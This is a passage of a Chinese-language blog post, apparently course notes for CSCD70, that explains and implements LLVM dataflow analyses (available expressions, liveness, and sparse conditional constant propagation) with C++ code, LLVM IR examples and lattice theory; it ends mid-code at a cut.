title="流程"></a>流程</h3><p>先遍历一次所有指令,从指令中得到分析的Domain.再遍历一次进行初始化对BVs和InstDomainValMap进行初始化,因为它们即将作为分析的INPUT.</p><p>然后便开始一轮一轮的分析traverseCFG,直到连续两轮结果相同为止,最后输出结果.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">virtual</span> AnalysisResult_t <span class="title">run</span><span class="params">(llvm::Function &amp;F,</span></span></span><br><span class="line"><span class="params"><span class="function">                             llvm::FunctionAnalysisManager &amp;FAM)</span> </span>{</span><br><span class="line"></span><br><span class="line">  <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; In : <span class="built_in">instructions</span>(F))</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">InitializeDomainFromInstruction</span>(In);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; BB : <span class="built_in">getBBConstRange</span>(F))</span><br><span class="line">  {</span><br><span class="line">    BVs[&amp;BB] = <span class="built_in">TMeetOp</span>().<span class="built_in">top</span>(DomainIdMap.<span class="built_in">size</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; In : <span class="built_in">getInstConstRange</span>(BB))</span><br><span class="line">    {</span><br><span class="line">      InstDomainValMap[&amp;In] = <span class="built_in">TMeetOp</span>().<span class="built_in">top</span>(DomainIdMap.<span class="built_in">size</span>());</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(<span class="built_in">traverseCFG</span>(F));</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printInstDomainValMap</span>(F);</span><br><span class="line">  <span class="keyword">return</span> std::<span class="built_in">make_tuple</span>(DomainIdMap, DomainVector, BVs, InstDomainValMap);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>对每一个基本块,首先通过getBoundaryVal获取所有INPUT的Meet来作为该块的INPUT,而对于其他指令,就取上一条指令的OUTPUT进行transferFunc就行.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// @brief Traverse through the CFG of the function.</span></span><br><span class="line"><span class="comment">/// @param F</span></span><br><span class="line"><span class="comment">/// @return True if either BasicBlock-DomainValue mapping or</span></span><br><span class="line"><span class="comment">///         Instruction-DomainValue mapping has been modified, false</span></span><br><span class="line"><span class="comment">///         otherwise.</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">traverseCFG</span><span class="params">(<span class="type">const</span> llvm::Function &amp;F)</span> </span>{</span><br><span class="line">  <span class="type">bool</span> Changed = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line">  <span class="comment">//在Froward和Backward的分析中,IDV,ODV的意义相反</span></span><br><span class="line">  DomainVal_t IDV,ODV;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; BB : <span class="built_in">getBBConstRange</span>(F))</span><br><span class="line">  {</span><br><span class="line">    IDV = <span class="built_in">getBoundaryVal</span>(BB);</span><br><span class="line">    BVs[&amp;BB] = IDV; </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; In : <span class="built_in">getInstConstRange</span>(BB))</span><br><span class="line">    {</span><br><span class="line">      ODV = InstDomainValMap[&amp;In];</span><br><span class="line">      Changed |= <span class="built_in">transferFunc</span>(In,IDV,ODV);</span><br><span class="line">      InstDomainValMap[&amp;In] = ODV;</span><br><span class="line">      IDV = ODV;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> Changed;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里还有一个特殊的处理,对于分析的Boudary Condition,通过其的MeetOperands为空识别出来,再将其初始化为之前预设的bc就行.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DomainVal_t <span class="title">getBoundaryVal</span><span class="params">(<span class="type">const</span> llvm::BasicBlock &amp;BB)</span> <span class="type">const</span> </span>{</span><br><span class="line">  MeetOperands_t MeetOperands = <span class="built_in">getMeetOperands</span>(BB);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//对于Boudary Condition,没有前驱块</span></span><br><span class="line">  <span class="keyword">if</span>(MeetOperands.<span class="built_in">empty</span>())</span><br><span class="line">    MeetOperands.<span class="built_in">push_back</span>(<span class="built_in">bc</span>());</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">meet</span>(MeetOperands);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>完成框架的工作之后,数据流分析只用完成TransferFunc的编写和遍历方向等的设置即可.</p><h2 id="可用表达式分析"><a href="#可用表达式分析" class="headerlink" title="可用表达式分析"></a>可用表达式分析</h2><p>其实有一个我一直在纠结的东西,就是在LLVM Pass上做可用表达式分析是否有意义.看下面的例子:</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">foo</span><span class="params">(<span class="type">int</span> A,<span class="type">int</span> B)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">int</span> C,D;</span><br><span class="line">    C = A+B;</span><br><span class="line">    A = A+<span class="number">1</span>; <span class="comment">//下面的IR分别是这条语句不存在和存在的情况.</span></span><br><span class="line">    D = A+B;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d%d"</span>,C,D);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">define dso_local void @foo(i32 noundef %0, i32 noundef %1) #0 {</span><br><span class="line">  %3 = add nsw i32 %0, %1</span><br><span class="line">  %4 = add nsw i32 %0, %1</span><br><span class="line">  ret void</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">define dso_local void @foo(i32 noundef %0, i32 noundef %1) #0 {</span><br><span class="line">  %3 = add nsw i32 %0, %1</span><br><span class="line">  %4 = add nsw i32 %0, 1</span><br><span class="line">  %5 = add nsw i32 %4, %1</span><br><span class="line">  ret void</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>可以发现原本的两次A+B,已经变成了两个不同的表达式add nsw i32 %0, %1和add nsw i32 %4, %1.<br>由于在Pass运行时,def-use和use-def链已经建立完成,况且IR也是SSA形式的,每一次对二元表达式的计算都是在定义一个新的变量,每一次计算使用的值都是其唯一定义的地方.并不存在去更改某个变量值的情况,也就不存在kill.如果有循环,可能会更改已经存在的变量的值,但稍微分析一下发现也没有意义. </p><p>不过在Meet多个控制流的DomainVal时,还是能起到可用表达式分析的作用.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312112029195.png"></p><p>对于kill,我没有想到一个理想的方法,参照了一些博客都是使用这样的方法:<br>通过本次指令的值被某个表达式使用,推断出本次指令是一次定义,kill掉该表达式.<br>但如前文所说,由于SSA,使用本次指令值的表达式一定在本次指令之前未曾出现,所以kill是无意义的.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(dfa::Expression expr : DomainVector)</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">if</span>(expr.LHS == &amp;Inst || expr.RHS == &amp;Inst)</span><br><span class="line">  {</span><br><span class="line">    <span class="type">int64_t</span> id;</span><br><span class="line">    <span class="keyword">if</span>((id = <span class="built_in">getDomainId</span>(expr))!=<span class="number">-1</span>)</span><br><span class="line">    {</span><br><span class="line">      NewODV.<span class="built_in">at</span>(id).Value = <span class="literal">false</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>即使不是SSA形式,这样的方法也并不理想:<br>假设有这样一个基本块,使用该方法分析出来的对表达式A+B的OUT会是True,因为加1之后的A值不再被使用,也就没有kill的机会.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C = A + B</span><br><span class="line">A = A + <span class="number">1</span></span><br></pre></td></tr></tbody></table></figure><p>gen倒是没啥问题.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(Inst.<span class="built_in">isBinaryOp</span>())</span><br><span class="line">{</span><br><span class="line">  <span class="function">dfa::Expression <span class="title">expr</span><span class="params">(Inst.getOpcode(),Inst.getOperand(<span class="number">0</span>),Inst.getOperand(<span class="number">1</span>))</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">int64_t</span> id;</span><br><span class="line">  <span class="keyword">if</span>((id = <span class="built_in">getDomainId</span>(expr))!= <span class="number">-1</span>)</span><br><span class="line">  {</span><br><span class="line">    NewODV.<span class="built_in">at</span>(id).Value = <span class="literal">true</span>;</span><br><span class="line">  }    </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>完整的TransferFunc</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AvailExprs::InitializeDomainFromInstruction</span><span class="params">(<span class="type">const</span> llvm::Instruction&amp; In)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">      <span class="keyword">if</span>(In.<span class="built_in">isBinaryOp</span>())</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span>((DomainIdMap.<span class="built_in">emplace</span>(std::<span class="built_in">pair</span>(dfa::Expression::<span class="built_in">ExpressionFromIn</span>(In),DomainIdMap.<span class="built_in">size</span>()))).second)</span><br><span class="line">        {</span><br><span class="line">          DomainVector.<span class="built_in">push_back</span>(dfa::Expression::<span class="built_in">ExpressionFromIn</span>(In));</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">AvailExprs::transferFunc</span><span class="params">(<span class="type">const</span> Instruction &amp;Inst, <span class="type">const</span> DomainVal_t &amp;IDV,</span></span></span><br><span class="line"><span class="params"><span class="function">                             DomainVal_t &amp;ODV)</span> </span>{</span><br><span class="line"></span><br><span class="line">  <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line">  DomainVal_t NewODV = IDV;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(dfa::Expression expr : DomainVector)</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span>(expr.LHS == &amp;Inst || expr.RHS == &amp;Inst)</span><br><span class="line">    {</span><br><span class="line">      <span class="type">int64_t</span> id;</span><br><span class="line">      <span class="keyword">if</span>((id = <span class="built_in">getDomainId</span>(expr))!=<span class="number">-1</span>)</span><br><span class="line">      {</span><br><span class="line">        NewODV.<span class="built_in">at</span>(id).Value = <span class="literal">false</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(Inst.<span class="built_in">isBinaryOp</span>())</span><br><span class="line">  {</span><br><span class="line">    <span class="function">dfa::Expression <span class="title">expr</span><span class="params">(Inst.getOpcode(),Inst.getOperand(<span class="number">0</span>),Inst.getOperand(<span class="number">1</span>))</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int64_t</span> id;</span><br><span class="line">    <span class="keyword">if</span>((id = <span class="built_in">getDomainId</span>(expr))!= <span class="number">-1</span>)</span><br><span class="line">    {</span><br><span class="line">      NewODV.<span class="built_in">at</span>(id).Value = <span class="literal">true</span>;</span><br><span class="line">    }    </span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(NewODV==ODV)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  ODV = NewODV;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312121417697.png"></p><h2 id="存活变量分析"><a href="#存活变量分析" class="headerlink" title="存活变量分析"></a>存活变量分析</h2><p>和可用表达式类似写出transferFunc就ok了.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">LiveNess::transferFunc</span><span class="params">(<span class="type">const</span> Instruction &amp;Inst, <span class="type">const</span> DomainVal_t &amp;IDV,</span></span></span><br><span class="line"><span class="params"><span class="function">                             DomainVal_t &amp;ODV)</span> </span>{</span><br><span class="line"></span><br><span class="line">  <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line">  DomainVal_t NewODV = IDV;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(Inst.<span class="built_in">hasNUsesOrMore</span>(<span class="number">1</span>))</span><br><span class="line">  {</span><br><span class="line">    <span class="type">int64_t</span> id;</span><br><span class="line">    <span class="keyword">if</span>((id = <span class="built_in">getDomainId</span>(dfa::Variable::<span class="built_in">VariableFromIn</span>(Inst)))!=<span class="number">-1</span>)</span><br><span class="line">    {</span><br><span class="line">      NewODV.<span class="built_in">at</span>(id).Value = <span class="literal">false</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span> Iter  = Inst.<span class="built_in">op_begin</span>();Iter != Inst.<span class="built_in">op_end</span>(); ++Iter)</span><br><span class="line">  {</span><br><span class="line">    Value *V = *Iter;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isa</span>&lt;Instruction&gt;(V)||<span class="built_in">isa</span>&lt;Argument&gt;(V))</span><br><span class="line">    {</span><br><span class="line">      <span class="type">int64_t</span> id;</span><br><span class="line">      <span class="keyword">if</span>((id = <span class="built_in">getDomainId</span>(V))!=<span class="number">-1</span>)</span><br><span class="line">      {</span><br><span class="line">        NewODV.<span class="built_in">at</span>(id).Value = <span class="literal">true</span>;</span><br><span class="line">    }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(NewODV==ODV)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  ODV = NewODV;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312121639563.png"></p><h2 id="稀疏条件常量传播"><a href="#稀疏条件常量传播" class="headerlink" title="稀疏条件常量传播"></a>稀疏条件常量传播</h2><h3 id="初始方案"><a href="#初始方案" class="headerlink" title="初始方案"></a>初始方案</h3><p>采用ForwardAnalysis,Domain为所有变量,用TValue为Bool,TMeetOp为Intersect.<br>TransferFunc如下:</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SCCP::transferFunc</span><span class="params">(<span class="type">const</span> Instruction &amp;Inst, <span class="type">const</span> DomainVal_t &amp;IDV,</span></span></span><br><span class="line"><span class="params"><span class="function">                             DomainVal_t &amp;ODV)</span> </span>{</span><br><span class="line"></span><br><span class="line">  <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line">    DomainVal_t NewODV = IDV;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isa</span>&lt;Instruction&gt;(Inst)||<span class="built_in">isa</span>&lt;Argument&gt;(Inst))</span><br><span class="line">    {</span><br><span class="line">        <span class="type">int64_t</span> id1,id2;</span><br><span class="line">        <span class="type">bool</span> isconstant = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>((id1 = <span class="built_in">getDomainId</span>(dfa::Variable::<span class="built_in">VariableFromIn</span>(Inst)))!= <span class="number">-1</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; operand : Inst.<span class="built_in">operands</span>())</span><br><span class="line">            {</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span>(!<span class="built_in">isa</span>&lt;ConstantInt&gt;(operand))</span><br><span class="line">              {</span><br><span class="line">                <span class="keyword">if</span>((id2 = <span class="built_in">getDomainId</span>(operand.<span class="built_in">get</span>()))!= <span class="number">-1</span>)</span><br><span class="line">                {</span><br><span class="line">                  <span class="keyword">if</span>(!(IDV[id2].Value==<span class="literal">true</span>))</span><br><span class="line">                  {</span><br><span class="line">                    NewODV[id1].Value = <span class="literal">false</span>;</span><br><span class="line">                    isconstant = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  }</span><br><span class="line">                }</span><br><span class="line">              }    </span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">if</span>(isconstant)</span><br><span class="line">                NewODV[id1].Value = <span class="literal">true</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(NewODV==ODV)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    ODV = NewODV;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>用一个小的demo来验证一下:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">define i32 @Loop(i32 noundef %0) {</span><br><span class="line">  %2 = add nsw i32 1, 2</span><br><span class="line">  %3 = add nsw i32 %2, 5</span><br><span class="line">  %4 = add nsw i32 %3, %0</span><br><span class="line">  ret i32 %4</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312130009515.png"><br>可以看到没什么问题(其实代码里还应该特化一下对phi指令的分析).<br>再用官方给的测试用例:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312130039485.png"><br>发现没有一个常量,于是分析一下用来测试的IR代码:<br>可以看出,常量应该有%.12,%.01,%4. 但识别出这三个常量都需要先识别出label %7不可达,而这才是SCCP 稀疏条件常量传播的意义.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">; <span class="type">int</span> <span class="title function_">Loop</span><span class="params">()</span> {</span><br><span class="line">;   <span class="type">int</span> i = <span class="number">1</span>, j = <span class="number">1</span>;</span><br><span class="line">;   <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">100</span>;) {</span><br><span class="line">;     <span class="keyword">if</span> (j &lt; <span class="number">20</span>) {</span><br><span class="line">;       j = i;</span><br><span class="line">;       k = k + <span class="number">1</span>;</span><br><span class="line">;     } <span class="keyword">else</span> {</span><br><span class="line">;       j = k;</span><br><span class="line">;       k = k + <span class="number">2</span>;</span><br><span class="line">;     }</span><br><span class="line">;   }</span><br><span class="line">;   <span class="keyword">return</span> j;</span><br><span class="line">; }</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">; @todo(CSCD70) Please complete the CHECK directives.</span><br><span class="line">define i32 @Loop() {</span><br><span class="line">  br label %1</span><br><span class="line">1:                                                ; preds = %9, %0</span><br><span class="line">  %.01 = phi i32 [ 1, %0 ], [ %.12, %9 ] ;j</span><br><span class="line">  %.0 = phi i32 [ 0, %0 ], [ %.1, %9 ] ;k</span><br><span class="line">  %2 = icmp slt i32 %.0, 100 ;k&lt;100</span><br><span class="line">  br i1 %2, label %3, label %10</span><br><span class="line"></span><br><span class="line">3:                                                ; preds = %1</span><br><span class="line">  %4 = icmp slt i32 %.01, 20 ;j&lt;20</span><br><span class="line">  br i1 %4, label %5, label %7</span><br><span class="line"></span><br><span class="line">5:                                                ; preds = %3</span><br><span class="line">  %6 = add nsw i32 %.0, 1 ;k+1</span><br><span class="line">  br label %9</span><br><span class="line"></span><br><span class="line">7:                                                ; preds = %3</span><br><span class="line">  %8 = add nsw i32 %.0, 2 ;k+2</span><br><span class="line">  br label %9</span><br><span class="line"></span><br><span class="line">9:                                                ; preds = %7, %5</span><br><span class="line">  %.12 = phi i32 [ 1, %5 ], [ %.0, %7 ] ;j = 1 | j = k</span><br><span class="line">  %.1 = phi i32 [ %6, %5 ], [ %8, %7 ] ; new k</span><br><span class="line">  br label %1</span><br><span class="line"></span><br><span class="line">10:                                               ; preds = %1</span><br><span class="line">  ret i32 %.01</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="改进版"><a href="#改进版" class="headerlink" title="改进版"></a>改进版</h3><h4 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h4><p>在补了下数据流分析基础后,再来看这个问题.<br>单个变量可能值域的Lattice设计为这个样子(回想一下,之前使用的Bool的值域其实也是一个Lattice)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312141242129.png"></p><p>Transferfunc像这样.有一点需要注意,之前所说的数据流分析中TranferFunc的单调性依赖于其gen集,kill集与输入无关这一性质,所以OUT与IN成正相关(相对于偏序关系来说).但这里的TransferFunc的gen集明显受到IN的影响,不过分析一下可以发现gen集同样与IN正相关,所以最终的OUT还是正相关的.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312141244522.png"></p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><h5 id="Basic-Lattice"><a href="#Basic-Lattice" class="headerlink" title="Basic Lattice"></a>Basic Lattice</h5><p>单个变量值域的Lattice由Status和Value构成.之所以需要Value的域,是在常量传播到跳转条件的时候会用到. 至于Meet的设计就遵照上面理论所示(其实是遵照Meet的本意,即求最大下界),这个也很巧妙的符合只有当两个常量满足c1 == c2时,才有c1 Meet c2还是常量.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">ConstantStatus</span>{</span><br><span class="line">  UNDEF = <span class="number">2</span>,</span><br><span class="line">  CONST = <span class="number">1</span>,</span><br><span class="line">  NAC = <span class="number">0</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Constant</span>{</span><br><span class="line">  <span class="type">int64_t</span> 